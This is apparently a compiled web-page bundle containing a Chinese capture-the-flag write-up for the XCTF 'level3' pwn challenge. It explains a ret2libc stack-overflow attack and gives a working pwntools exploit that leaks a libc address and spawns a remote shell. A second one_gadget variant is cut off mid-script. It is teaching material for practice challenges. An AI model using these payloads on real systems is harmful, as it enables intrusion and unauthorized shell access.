(window.webpackJsonp=window.webpackJsonp||[]).push([[47],{602:function(s,t,a){"use strict";a.r(t);var n=a(4),e=Object(n.a)({},(function(){var s=this,t=s.$createElement,a=s._self._c||t;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"wp"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#wp"}},[s._v("#")]),s._v(" wp")]),s._v(" "),a("p",[s._v("转载自 XCTF攻防世界 level3 https://www.52pojie.cn/thread-1032651-1-1.html")]),s._v(" "),a("p",[s._v("首先，检查一下程序基本信息：")]),s._v(" "),a("p",[a("img",{attrs:{src:"pwn_70_xman_level3.md1.png",alt:"Alt text"}})]),s._v(" "),a("p",[s._v("程序很简单，保护开的也差不多。但是需要注意，这道题单独给出了libc，而且根据题目提示，程序中没有现成的system函数。这就需要我们从libc中动态加载system函数。")]),s._v(" "),a("p",[s._v("初步思路：PIE没有开启，那么在libc中函数的offset就是固定的，只要确认了libc的base address，然后计算出system函数的offset，就可以定位到system函数的真实地址，实现调用。")]),s._v(" "),a("p",[s._v("IDA查看源码：")]),s._v(" "),a("ul",[a("li",[s._v("strings查看一下是否有明显的字符串信息：")])]),s._v(" "),a("p",[a("img",{attrs:{src:"pwn_70_xman_level3.md2.png",alt:"Alt text"}})]),s._v(" "),a("p",[s._v("从字符串信息来看，没有明显的可以利用的字符串，函数也只有write和read，在某些情况下这两个函数可以构造溢出，先留心一下。")]),s._v(" "),a("ul",[a("li",[s._v("main函数：")])]),s._v(" "),a("p",[a("img",{attrs:{src:"pwn_70_xman_level3.md3.png",alt:"pwn_70_xman_level3.md3"}})]),s._v(" "),a("p",[s._v("没有明显的问题，直接进入vulnerable_function()")]),s._v(" "),a("ul",[a("li",[s._v("vulnerable_function函数：")])]),s._v(" "),a("p",[a("img",{attrs:{src:"pwn_70_xman_level3.md4.png",alt:"pwn_70_xman_level3.md4"}})]),s._v(" "),a("p",[s._v("有一个缓冲区buf，在read函数中进行了调用。可以进行溢出。")]),s._v(" "),a("p",[a("strong",[s._v("攻击思路：")]),s._v("\nlibc中的函数的相对地址是固定的，要想获取到system函数的地址，可以通过write()函数进行offset计算。")]),s._v(" "),a("ol",[a("li",[s._v("首先利用write()函数计算出write()函数的真实地址；")]),s._v(" "),a("li",[s._v('利用相对offset计算出system和"/bin/sh"的真实地址。')])]),s._v(" "),a("p",[s._v("在vulnerable_function()中，先调用了write()函数，然后调用read()函数。write()函数返回到vulnerable_function()后，再进行read()函数调用，这样我们就可以进行二次攻击。")]),s._v(" "),a("ul",[a("li",[a("p",[s._v("第一次攻击我们利用栈溢出将write()函数在got表中的真实地址leak出来，然后减去libc中的offset，就可以得到libc的base address。")])]),s._v(" "),a("li",[a("p",[s._v("第二次攻击重新进入main函数，再次通过栈溢出，利用system函数进行getshell。")])])]),s._v(" "),a("p",[s._v("两次攻击stack中的情况：")]),s._v(" "),a("table",[a("thead",[a("tr",[a("th",[s._v("First stack")]),s._v(" "),a("th",[s._v("Second stack")])])]),s._v(" "),a("tbody",[a("tr",[a("td",[s._v("'A'*0x88")]),s._v(" "),a("td",[s._v("'A'*0x88")])]),s._v(" "),a("tr",[a("td",[s._v("EBP")]),s._v(" "),a("td",[s._v("EBP")])]),s._v(" "),a("tr",[a("td",[s._v("write@plt")]),s._v(" "),a("td",[s._v("sys_addr")])]),s._v(" "),a("tr",[a("td",[s._v("main_addr")]),s._v(" "),a("td",[s._v("0xdeadbeef")])]),s._v(" "),a("tr",[a("td",[s._v("1")]),s._v(" "),a("td",[s._v("bin_sh_addr")])]),s._v(" "),a("tr",[a("td",[s._v("write@got")]),s._v(" "),a("td",[s._v("XXXX")])]),s._v(" "),a("tr",[a("td",[s._v("0xdeadbeef")]),s._v(" "),a("td",[s._v("XXXX")])])])]),s._v(" "),a("p",[s._v("这样的话，第一次使用的payload构成如下：")]),s._v(" "),a("p",[s._v("*"),a("em",[s._v("payload = 'A'"),a("em",[s._v("0x88 + p32(0xdeadbeef) + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(0xdeadbeef)")])])]),s._v(" "),a("p",[s._v("利用第一次攻击，就可以获取到libc的基地址。然后进行第二次攻击，使用的payload构成为：")]),s._v(" "),a("p",[s._v("*"),a("em",[s._v("payload0 = 'A'"),a("em",[s._v("0x88 + p32(0xdeadbeef) + p32(sys_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)")])])]),s._v(" "),a("p",[s._v("中间涉及到几个地址的计算，各地址的计算方式如下：")]),s._v(" "),a("table",[a("thead",[a("tr",[a("th",[s._v("Address")]),s._v(" "),a("th",[s._v("Calculate")])])]),s._v(" "),a("tbody",[a("tr",[a("td",[s._v("libc_addr")]),s._v(" "),a("td",[s._v("write_got_addr - libc.symbols['write']")])]),s._v(" "),a("tr",[a("td",[s._v("sys_addr")]),s._v(" "),a("td",[s._v("libc_addr + libc.symbols['system']")])]),s._v(" "),a("tr",[a("td",[s._v("bin_sh_addr")]),s._v(" "),a("td",[s._v("libc_addr + 0x15902b")])])])]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('备注：0x15902b是"/bin/sh"在libc中的地址，可以使用libcsearch进行获取，也可以使用 strings -a -t x libc_32.so.6 | grep "/bin/sh" 进行获取。此外，还有一个libcSearcher可以使用，有兴趣的可以研究一下。\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v('这样的两次攻击下来，就可以使用libc中的system函数进行"/bin/sh"的调用，从而getshell。')]),s._v(" "),a("h2",{attrs:{id:"exp"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#exp"}},[s._v("#")]),s._v(" EXP:")]),s._v(" "),a("div",{staticClass:"language-python line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-python"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" pwn "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v("\n \nsh "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" remote"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'124.126.19.106'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("35860")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#sh=process('./level3')")]),s._v("\n \n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#context.log_level = 'debug'")]),s._v("\nelf"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("ELF"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'./level3'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nlibc"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("ELF"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'./libc_32.so.6'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#get func address")]),s._v("\nwrite_plt "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" elf"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("plt"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'write'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\nwrite_got "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" elf"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("got"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'write'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\nmain_addr "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" elf"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("symbols"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'main'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#char[88] ebp  write函数地址  write函数返回地址(返回到main函数)  write函数参数一(1)  write函数参数二(write_got地址)  write函数参数三(写4字节)")]),s._v("\npayload "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" flat"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'A'")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x88")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" p32"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0xdeadbeef")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" p32"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("write_plt"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" p32"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("main_addr"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" p32"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" p32"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("write_got"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" p32"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0xdeadbeef")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 0xdeadbeef 可随意如 p32(4)，填充4字节, 上面就是把write_got输出, 然后返回main头部")]),s._v("\n \nsh"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("sendlineafter"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Input:\\n"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("payload"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n \n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#leak write's addr in got")]),s._v("\nwrite_got_addr "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" u32"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("sh"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("recv"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'write_got address is'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("hex")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("write_got_addr"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n \n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#leak libc's addr 计算lib库加载基址")]),s._v("\nlibc_base "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" write_got_addr "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v(" libc"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("symbols"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'write'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'libc address is'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("hex")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("libc_base"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n \n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#get system's addr")]),s._v("\nsys_addr "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" libc_base "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" libc"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("symbols"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'system'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'system address is'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("hex")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("sys_addr"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n \n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v('#get bin/sh \'s addr    strings -a -t x libc_32.so.6 | grep "/bin/sh"')]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v('#libc.search("/bin/sh").next()')]),s._v("\nbin_sh_addr "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" libc_base "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x15902b")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'/bin/sh address is'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("hex")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("bin_sh_addr"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n \n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#get second payload")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("##char[88] ebp system system函数的返回地址 system函数的参数(bin_sh_addr)")]),s._v("\npayload0 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" flat"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'A'")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x88")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" p32"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0xdeadbeef")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" p32"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("sys_addr"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" p32"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0xdeadbeef")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" p32"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("bin_sh_addr"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n \nsh"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("sendline"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("payload0"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nsh"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("interactive"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br"),a("span",{staticClass:"line-number"},[s._v("31")]),a("br"),a("span",{staticClass:"line-number"},[s._v("32")]),a("br"),a("span",{staticClass:"line-number"},[s._v("33")]),a("br"),a("span",{staticClass:"line-number"},[s._v("34")]),a("br"),a("span",{staticClass:"line-number"},[s._v("35")]),a("br"),a("span",{staticClass:"line-number"},[s._v("36")]),a("br"),a("span",{staticClass:"line-number"},[s._v("37")]),a("br"),a("span",{staticClass:"line-number"},[s._v("38")]),a("br"),a("span",{staticClass:"line-number"},[s._v("39")]),a("br"),a("span",{staticClass:"line-number"},[s._v("40")]),a("br"),a("span",{staticClass:"line-number"},[s._v("41")]),a("br"),a("span",{staticClass:"line-number"},[s._v("42")]),a("br")])]),a("p",[s._v("执行完成后，可以成功拿到flag：")]),s._v(" "),a("p",[a("img",{attrs:{src:"pwn_70_xman_level3.md5.png",alt:"pwn_70_xman_level3.md5"}})]),s._v(" "),a("h2",{attrs:{id:"总结"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#总结"}},[s._v("#")]),s._v(" 总结")]),s._v(" "),a("p",[s._v('这道题感觉才算真正开始入门pwn的栈溢出，遇到了没有system和"/bin/sh"的情况，思路也比较好玩，需要一定的技巧和脑洞才能完成这道题。可能在大师傅们的眼里很简单，但是对于刚入门pwn的小白来说，这道题很值得玩味，挺有价值的。 此外，需要花一定的时间学习一下pwntools，这玩意真的是pwn题的神器233333。')]),s._v(" "),a("h2",{attrs:{id:"解法2"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#解法2"}},[s._v("#")]),s._v(" 解法2")]),s._v(" "),a("p",[s._v("可以使用one_gadget工具，找到execve地址可以省略使用system和/bin/sh地址的步骤")]),s._v(" "),a("div",{staticClass:"language-sh line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[s._v("kali@kali:/mnt/hgfs/vmware$ one_gadget  libc_32.so.6 \n0x3a80c execve"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"/bin/sh"')]),s._v(", esp+0x28, environ"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nconstraints:\n  esi is the GOT address of libc\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("div",{staticClass:"language-python line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-python"}},[a("code",[s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" pwn "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v("\np "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" remote"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"111.198.29.45"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("37840")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nelf "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" ELF"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"./level3"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nlibc "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" ELF"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"./libc_32.so.6"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\ncontext"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("log_level"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'debug'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("arch"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'i386'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("os"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'linux'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nexecve "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x3a80c")]),s._v("\njunk "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"A"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x88")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nmain_addr "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" elf"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("symbols"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'main'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\nwrite_got "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" elf"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("got"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'write'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\nwrite_plt "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" elf"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("plt"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'write'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\npayload1 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" junk "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" p32"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("write_plt"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" p32"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("main_addr"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\npayload1 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+=")]),s._v(" p32"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" p32"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("write_got"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" p32"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\np"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("recv"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token 